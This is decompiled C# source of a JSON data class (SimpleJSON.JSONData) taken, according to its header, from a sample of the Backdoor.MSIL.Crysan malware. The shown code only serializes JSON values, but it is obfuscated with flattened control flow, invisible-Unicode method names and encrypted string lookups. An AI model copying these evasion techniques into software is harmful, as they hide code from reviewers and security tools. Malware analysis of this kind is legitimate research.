// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONData
// Assembly: MemberAccessExcepti, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 46220647-D1CE-4792-A51F-9B328C1E60FB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\Backdoor.MSIL.Crysan.dst-d95fbf8fa85f2534926c1be2d0a82ad2fc89b2ed31ad42155ca0b92b9d959ccf.exe

using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONData : JSONNode
  {
    private string m_Data;

    public override string Value
    {
      get => this.m_Data;
      set => this.m_Data = value;
    }

    public JSONData(string aData) => this.m_Data = aData;

    public JSONData(float aData)
    {
label_1:
      int num1 = -948354917;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -21782564)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            this.AsFloat = aData;
            num1 = (int) num2 * -1681903265 ^ 1957324664;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public JSONData(double aData)
    {
label_1:
      int num1 = 1676160147;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1072216091)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            this.AsDouble = aData;
            num1 = (int) num2 * 73006986 ^ -1186618753;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public JSONData(bool aData)
    {
label_1:
      int num1 = 1951486972;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 710576494)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.AsBool = aData;
            num1 = (int) num2 * -29541064 ^ 946766435;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public JSONData(int aData)
    {
label_1:
      int num1 = -684165468;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1493789791)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.AsInt = aData;
            num1 = (int) num2 * -1268871475 ^ 1520748756;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public override string ToString() => JSONData.\u202C‮⁭​‪‏‮⁭‪⁯​⁭‌​‬⁫‎‫⁭‌⁫‮‭‌​⁮‍‭⁮‍⁯‮‍⁬⁭‫⁪‎​⁮‮(\u003CModule\u003E.\u200C​‏⁮‪⁪‍‍‎‎‌‎‎‫‌‬⁫⁮‮‌⁮‌‎⁭‮‌‌‬⁪⁬‭⁮‮‪⁭⁪‭‬‏‬‮<string>(2600585588U), JSONNode.Escape(this.m_Data), \u003CModule\u003E.\u200B⁫⁯⁫⁪‏‪⁯⁬‏‍‮‭⁯‎⁬‍⁫⁮⁪‌‮‏‬⁮‭⁮⁯⁬‭‎‍‪​⁭‎‬⁮⁮‎‮<string>(2453569894U));

    public override string ToString(string aPrefix) => JSONData.\u202C‮⁭​‪‏‮⁭‪⁯​⁭‌​‬⁫‎‫⁭‌⁫‮‭‌​⁮‍‭⁮‍⁯‮‍⁬⁭‫⁪‎​⁮‮(\u003CModule\u003E.\u206C⁭⁭⁪‫⁮‭‍⁮‏⁬‫⁬‎⁯⁭⁬​⁯‌‮‪‫‎⁫⁪​‏‌⁮⁯​⁫‮‌⁮‍‫‪⁭‮<string>(2590540362U), JSONNode.Escape(this.m_Data), \u003CModule\u003E.\u200B⁫⁯⁫⁪‏‪⁯⁬‏‍‮‭⁯‎⁬‍⁫⁮⁪‌‮‏‬⁮‭⁮⁯⁬‭‎‍‪​⁭‎‬⁮⁮‎‮<string>(2453569894U));

    public override void Serialize(BinaryWriter aWriter)
    {
      JSONData jsonData = new JSONData("");
label_1:
      int num1 = 1905335084;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 736113964)) % 18U)
        {
          case 0:
            int num3 = JSONData.\u200E‮⁬‍‌‎‍⁯​‪⁮‬‪‭‪‬‌⁫​​‪⁮‍‪⁭‬‏⁮‫‌​‫‍⁮⁪⁭‌⁯⁫‎‮(jsonData.m_Data, this.m_Data) ? 646195666 : (num3 = 1920424831);
            num1 = num3 ^ (int) num2 * -983090097;
            continue;
          case 1:
            goto label_3;
          case 2:
            jsonData.AsDouble = this.AsDouble;
            int num4;
            num1 = num4 = JSONData.\u200E‮⁬‍‌‎‍⁯​‪⁮‬‪‭‪‬‌⁫​​‪⁮‍‪⁭‬‏⁮‫‌​‫‍⁮⁪⁭‌⁯⁫‎‮(jsonData.m_Data, this.m_Data) ? 801035943 : (num4 = 1701308570);
            continue;
          case 3:
            JSONData.\u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮(aWriter, (byte) 3);
            JSONData.\u202A‎⁯⁪⁮‏⁫‫⁭‌⁯⁮⁫‪‍⁬‮‎​‏⁯‎‏‏⁭⁫⁮⁮‏‌​⁬‬‫‫‌⁭‏⁫⁯‮(aWriter, this.m_Data);
            num1 = 66028509;
            continue;
          case 4:
            JSONData.\u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮(aWriter, (byte) 6);
            num1 = (int) num2 * 1275978342 ^ 802478783;
            continue;
          case 5:
            goto label_9;
          case 6:
            int num5 = JSONData.\u200E‮⁬‍‌‎‍⁯​‪⁮‬‪‭‪‬‌⁫​​‪⁮‍‪⁭‬‏⁮‫‌​‫‍⁮⁪⁭‌⁯⁫‎‮(jsonData.m_Data, this.m_Data) ? 1199332636 : (num5 = 1737366640);
            num1 = num5 ^ (int) num2 * 970800181;
            continue;
          case 7:
            goto label_14;
          case 8:
            JSONData.\u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮(aWriter, (byte) 4);
            num1 = (int) num2 * 1889124208 ^ 131072780;
            continue;
          case 9:
            goto label_16;
          case 10:
            jsonData.AsBool = this.AsBool;
            num1 = 1773163630;
            continue;
          case 11:
            JSONData.\u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮(aWriter, (byte) 7);
            JSONData.\u206C‌⁯‍​‎‬‬‎‎‍‬‌⁬⁬⁫‫⁬‫⁫‏⁭‬⁮⁫‎‮⁮‪‌‭‎⁫⁬‫⁫‫‏‬‮(aWriter, this.AsFloat);
            num1 = (int) num2 * 1529104107 ^ -1888406492;
            continue;
          case 12:
            jsonData.AsInt = this.AsInt;
            num1 = (int) num2 * -1540432828 ^ -1898937194;
            continue;
          case 13:
            int num6 = JSONData.\u200E‮⁬‍‌‎‍⁯​‪⁮‬‪‭‪‬‌⁫​​‪⁮‍‪⁭‬‏⁮‫‌​‫‍⁮⁪⁭‌⁯⁫‎‮(jsonData.m_Data, this.m_Data) ? -152763121 : (num6 = -2057056316);
            num1 = num6 ^ (int) num2 * 1784778640;
            continue;
          case 14:
            goto label_18;
          case 15:
            goto label_1;
          case 16:
            jsonData.AsFloat = this.AsFloat;
            num1 = 1193021827;
            continue;
          case 17:
            JSONData.\u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮(aWriter, (byte) 5);
            JSONData.\u206F⁪⁯‏‮⁯⁭‏‬‪⁫‭‍⁮‮⁬‏⁪‭​‍‫​‪‭⁯‎‍‮⁯‮‪‪​‍⁮⁮⁯⁬⁮‮(aWriter, this.AsDouble);
            num1 = (int) num2 * -1131174807 ^ 90265600;
            continue;
          default:
            goto label_20;
        }
      }
label_3:
      return;
label_9:
      return;
label_14:
      return;
label_20:
      return;
label_16:
      JSONData.\u202A‪​‍⁫‭‍⁭‭⁮‪‭‬⁪⁯‫‫‪‏⁫⁫‭⁯⁮⁯‫‫‮⁯⁭‮‬‫‌⁮​⁪⁫‬⁬‮(aWriter, this.AsBool);
      return;
label_18:
      JSONData.\u202A⁬⁫‬‍‫‫‭‌​‎‮‫⁪‫​⁫⁬‬‮‍​⁪⁪‬⁯‌‬‌‫‫⁯⁬⁮‬⁭‫⁯‪⁯‮(aWriter, this.AsInt);
    }

    static string \u202C‮⁭​‪‏‮⁭‪⁯​⁭‌​‬⁫‎‫⁭‌⁫‮‭‌​⁮‍‭⁮‍⁯‮‍⁬⁭‫⁪‎​⁮‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static bool \u200E‮⁬‍‌‎‍⁯​‪⁮‬‪‭‪‬‌⁫​​‪⁮‍‪⁭‬‏⁮‫‌​‫‍⁮⁪⁭‌⁯⁫‎‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static void \u206B‭⁬‏⁫‏‭⁫‫‎⁫‭‌‫⁬⁪‎⁯‎⁫‭‭⁬‬‮‌⁯⁬‬⁭‭‮​‪‮‫‍⁪‬‭‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u202A⁬⁫‬‍‫‫‭‌​‎‮‫⁪‫​⁫⁬‬‮‍​⁪⁪‬⁯‌‬‌‫‫⁯⁬⁮‬⁭‫⁯‪⁯‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);

    static void \u206C‌⁯‍​‎‬‬‎‎‍‬‌⁬⁬⁫‫⁬‫⁫‏⁭‬⁮⁫‎‮⁮‪‌‭‎⁫⁬‫⁫‫‏‬‮([In] BinaryWriter obj0, [In] float obj1) => obj0.Write(obj1);

    static void \u206F⁪⁯‏‮⁯⁭‏‬‪⁫‭‍⁮‮⁬‏⁪‭​‍‫​‪‭⁯‎‍‮⁯‮‪‪​‍⁮⁮⁯⁬⁮‮([In] BinaryWriter obj0, [In] double obj1) => obj0.Write(obj1);

    static void \u202A‪​‍⁫‭‍⁭‭⁮‪‭‬⁪⁯‫‫‪‏⁫⁫‭⁯⁮⁯‫‫‮⁯⁭‮‬‫‌⁮​⁪⁫‬⁬‮([In] BinaryWriter obj0, [In] bool obj1) => obj0.Write(obj1);

    static void \u202A‎⁯⁪⁮‏⁫‫⁭‌⁯⁮⁫‪‍⁬‮‎​‏⁯‎‏‏⁭⁫⁮⁮‏‌​⁬‬‫‫‌⁭‏⁫⁯‮([In] BinaryWriter obj0, [In] string obj1) => obj0.Write(obj1);
  }
}
